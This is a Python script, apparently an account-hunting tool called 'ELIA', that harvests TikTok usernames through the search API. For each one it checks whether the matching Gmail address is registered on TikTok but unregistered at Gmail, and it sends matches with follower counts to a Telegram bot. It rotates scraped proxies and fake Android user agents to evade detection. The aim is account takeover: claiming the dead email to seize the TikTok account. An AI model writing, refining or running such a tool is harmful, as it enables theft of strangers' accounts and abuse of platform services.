import requests
import random
import time
import json
import string
import os
import sys
import re
from threading import Thread, Lock
from datetime import datetime

# --- [ COLORS ] ---
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m'
F = '\033[2;32m'
Z3 = '\033[1;31m'
L = "\033[1;95m"
C = '\033[2;35m'
J2 = '\x1b[38;5;203m'
C1 = '\x1b[38;5;120m'

# Stats
lock = Lock()
stats = {"checked": 0, "tiktok_reg": 0, "gmail_avail": 0, "hits": 0, "proxies": 0}
proxies_pool = []

def get_android_ua():
    versions = ["10", "11", "12", "13"]
    models = ["SM-G981B", "SM-S908B", "Pixel 7", "Redmi Note 12"]
    return f"Mozilla/5.0 (Linux; Android {random.choice(versions)}; {random.choice(models)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"

def scrape_proxies():
    global proxies_pool
    while True:
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10).text
            with lock:
                proxies_pool = list(set(res.splitlines()))
                stats["proxies"] = len(proxies_pool)
        except: pass
        time.sleep(300)

def get_proxy():
    if not proxies_pool: return None
    p = random.choice(proxies_pool)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def banner():
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑽𝟖.𝟎 𝑹𝑬𝑨𝑳𝑰𝑺𝑻𝑰𝑪 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(f"""{F}
         ██████╗ ███████╗ █████╗ ██╗     ██╗███████╗████████╗██╗ ██████╗
         ██╔══██╗██╔════╝██╔══██╗██║     ██║██╔════╝╚══██╔══╝██║██╔════╝
         ██████╔╝█████╗  ███████║██║     ██║███████╗   ██║   ██║██║     
         ██╔══██╗██╔══╝  ██╔══██║██║     ██║╚════██║   ██║   ██║██║     
         ██║  ██║███████╗██║  ██║███████╗██║███████║   ██║   ██║╚██████╗
         ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚═╝ ╚═════╝
    {X}      [꧁ 𝑹𝑬𝑨𝑳𝑰𝑺𝑻𝑰𝑪 𝑼𝑺𝑬𝑹𝑺 + 𝑨𝑵𝑫𝑹𝑶𝑰𝑫 𝑬𝑴𝑼𝑳𝑨𝑻𝑰𝑶𝑵 ꧂ ]                       
{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    """)

def update_display(msg=""):
    with lock:
        c, tr, ga, h, pc = stats["checked"], stats["tiktok_reg"], stats["gmail_avail"], stats["hits"], stats["proxies"]
        sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Check: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {F}HITS: {P}{h} {Z}| {L}Prox: {P}{pc} {Z}» {X}{msg[:15]}")
        sys.stdout.flush()

class RealisticHunter:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id

    def send_hit(self, username, followers, name):
        tlg = f'''
🎯 𝐑𝐄𝐀𝐋𝐈𝐒𝐓𝐈𝐂 𝐇𝐈𝐓 🎯
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
👤 𝗡𝗮𝗺𝗲 : {name}
👤 𝗨𝘀𝗲𝗿 : {username}
📧 𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers:,}
✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗦𝗶𝗴𝗻𝗨𝗽
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
        '''
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", json={"chat_id": self.chat_id, "text": tlg})
            with lock: stats["hits"] += 1
        except: pass

    def check_gmail(self, email, proxy):
        # Gmail logic: 6+ chars is mandatory for availability
        if len(email.split('@')[0]) < 6: return False
        try:
            url = f"https://mail.google.com/mail/gxlu?email={email}"
            res = requests.get(url, headers={'User-Agent': get_android_ua()}, proxies=proxy, timeout=7)
            return 'Set-Cookie' not in res.headers
        except: return False

    def check_tiktok_reg(self, email, proxy):
        try:
            url = "https://www.tiktok.com/passport/email/check_email_registered"
            params = {"email": email, "aid": 1233}
            res = requests.get(url, params=params, headers={"User-Agent": get_android_ua()}, proxies=proxy, timeout=7).json()
            return res.get("is_registered") == 1
        except: return False

    def get_users(self, proxy):
        """Get users with realistic patterns (Name + Year / Name + Name)"""
        try:
            names = ["ahmed", "ali", "mohamed", "sara", "king", "star", "pro", "vlog", "dark", "light", "user", "master"]
            years = ["1998", "1999", "2000", "2001", "2002", "2003", "2004", "2005", "2010", "2015"]
            kw = random.choice(names) + random.choice(["", ".", "_"]) + random.choice(years)
            
            update_display(f"Search: {kw}")
            url = "https://www.tiktok.com/api/search/user/full/"
            params = {"keyword": kw, "count": 15, "aid": 1988, "msToken": "".join(random.choices(string.ascii_letters, k=32))}
            res = requests.get(url, params=params, headers={"User-Agent": get_android_ua()}, proxies=proxy, timeout=10).json()
            return res.get("user_list", [])
        except: return []

    def start(self):
        while True:
            try:
                proxy = get_proxy()
                users = self.get_users(proxy)
                
                for user in users:
                    username = user['user_info']['unique_id']
                    # Realistic Filter: Length 6-20, no complex symbols
                    if len(username) < 6 or len(username) > 20: continue
                    
                    email = f"{username}@gmail.com"
                    update_display(f"Check: {username}")
                    
                    with lock: stats["checked"] += 1
                    if self.check_tiktok_reg(email, proxy):
                        with lock: stats["tiktok_reg"] += 1
                        if self.check_gmail(email, proxy):
                            with lock: stats["gmail_avail"] += 1
                            self.send_hit(username, user['user_info']['follower_count'], user['user_info']['nickname'])
                    update_display()
            except: pass

if __name__ == "__main__":
    banner()
    bot_token = input(f"{P} [{F}?{P}] BOT TOKEN : ")
    chat_id = input(f"{P} [{F}?{P}] CHAT ID   : ")
    threads_num = int(input(f"{P} [{F}?{P}] THREADS   : "))
    
    Thread(target=scrape_proxies, daemon=True).start()
    print(f"{F} [!] Scraping initial proxies...{P}")
    while not proxies_pool: time.sleep(1)
    
    hunter = RealisticHunter(bot_token, chat_id)
    banner()
    for _ in range(threads_num):
        Thread(target=hunter.start, daemon=True).start()
    
    while True:
        time.sleep(1)
